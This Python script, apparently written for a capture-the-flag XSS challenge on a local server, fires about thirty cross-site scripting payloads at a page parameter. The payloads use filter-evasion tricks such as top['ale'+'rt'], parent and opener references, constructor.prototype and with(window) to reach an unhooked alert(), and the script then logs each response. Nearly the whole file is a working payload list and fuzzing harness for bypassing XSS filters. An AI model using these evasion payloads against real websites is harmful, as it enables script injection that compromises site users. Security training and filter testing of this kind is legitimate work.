import requests
import urllib.parse

# Target URL
target = "http://127.0.0.1:32955/page"

# Test various window hierarchy references to find unhooked alert
# HTML tags are stripped, so we use tag stripping to inject JS

test_payloads = [
    # Direct window references through different contexts
    ("top.alert", "top.alert('XSS')"),
    ("top['alert']", "top['alert']('XSS')"),
    ("top[ale+rt]", "top['ale'+'rt']('XSS')"),
    
    # Parent window references
    ("parent.alert", "parent.alert('XSS')"),
    ("parent['alert']", "parent['alert']('XSS')"),
    ("parent[ale+rt]", "parent['ale'+'rt']('XSS')"),
    
    # Opener window references
    ("opener.alert", "opener&&opener.alert('XSS')"),
    ("opener['alert']", "opener&&opener['alert']('XSS')"),
    
    # Self references
    ("self.alert", "self.alert('XSS')"),
    ("self['alert']", "self['alert']('XSS')"),
    ("window['ale'+'rt']", "window['ale'+'rt']('XSS')"),
    
    # Nested window references
    ("top.parent.alert", "top.parent&&top.parent.alert('XSS')"),
    ("parent.top.alert", "parent.top&&parent.top.alert('XSS')"),
    ("top.self.alert", "top.self&&top.self.alert('XSS')"),
    ("self.top.alert", "self.top&&self.top.alert('XSS')"),
    
    # Window frames references
    ("window.frames[0].alert", "window.frames[0]&&window.frames[0].alert('XSS')"),
    ("top.frames[0].alert", "top.frames[0]&&top.frames[0].alert('XSS')"),
    
    # Constructor prototype approach
    ("window.constructor.prototype.alert", "window.constructor.prototype.alert('XSS')"),
    ("top.constructor.prototype.alert", "top.constructor.prototype.alert('XSS')"),
    
    # This reference
    ("this.alert", "this.alert('XSS')"),
    ("this['alert']", "this['alert']('XSS')"),
    
    # Content window references
    ("contentWindow.alert", "contentWindow&&contentWindow.alert('XSS')"),
    
    # Window object properties
    ("window.parent.alert", "window.parent&&window.parent.alert('XSS')"),
    ("window.top.alert", "window.top&&window.top.alert('XSS')"),
    
    # location.href approach to get window context
    ("location.href.window.alert", "(location.href,window).alert('XSS')"),
    
    # Try using with statement
    ("with(window)alert", "with(window)alert('XSS')"),
    
    # Try accessing window through different methods
    ("Window.prototype.alert", "Window.prototype.alert('XSS')"),
    ("window.__proto__.alert", "window.__proto__.alert('XSS')"),
    
    # Double parent/top nesting
    ("parent.parent.alert", "parent.parent&&parent.parent.alert('XSS')"),
    ("top.top.alert", "top.top&&top.top.alert('XSS')"),
]

print("=" * 60)
print("Testing Window Hierarchy References for Unhooked alert()")
print("=" * 60)
print(f"Target: {target}\n")

results = []

for name, payload in test_payloads:
    try:
        # Send the payload as query parameter (common XSS injection point)
        # Using 'input' as parameter name which is common for challenge inputs
        params = {'input': payload}
        
        response = requests.get(target, params=params, timeout=10)
        
        # Check response for evidence of success/failure
        status = response.status_code
        response_text = response.text
        
        # Store result
        result = {
            'name': name,
            'payload': payload,
            'status': status,
            'response_length': len(response_text),
            'response_preview': response_text[:500]
        }
        results.append(result)
        
        # Print test info
        print(f"\n[TEST] {name}")
        print(f"Payload: {payload[:60]}...")
        print(f"Status: {status} | Length: {len(response_text)}B")
        
        # Check for interesting patterns in response
        if 'alert' in response_text.lower():
            print(f"[+] Response contains 'alert' - payload may be echoing")
            
        if 'XSS' in response_text:
            print(f"[+] Response contains 'XSS' - payload echoed")
            
        # Check for common error patterns
        if 'undefined' in response_text.lower():
            print(f"[!] 'undefined' found - reference may not exist")
            
        if 'error' in response_text.lower():
            print(f"[!] 'error' found in response")
        
        # Print unique responses (first few lines)
        lines = response_text.split('\n')[:5]
        for line in lines:
            if line.strip():
                print(f"  -> {line[:100]}")
                
    except Exception as e:
        print(f"[ERROR] {name}: {str(e)}")
        results.append({
            'name': name,
            'payload': payload,
            'error': str(e)
        })

# Summary
print("\n" + "=" * 60)
print("SUMMARY OF TESTS")
print("=" * 60)
print(f"Total tests: {len(test_payloads)}")
print(f"Successful HTTP requests: {len([r for r in results if 'status' in r])}")

# Check each result
for r in results:
    if 'status' in r:
        if r['status'] == 200:
            print(f"  200 OK: {r['name']}")

print("\n" + "=" * 60)
print("DETAILED RESPONSES:")
print("=" * 60)

for r in results:
    print(f"\n--- {r['name']} ---")
    print(f"Payload: {r['payload']}")
    if 'status' in r:
        print(f"Status: {r['status']} | Length: {r['response_length']}B")
        print(f"Response (first 500 chars):\n{r['response_preview']}")
    else:
        print(f"Error: {r.get('error', 'Unknown')}")

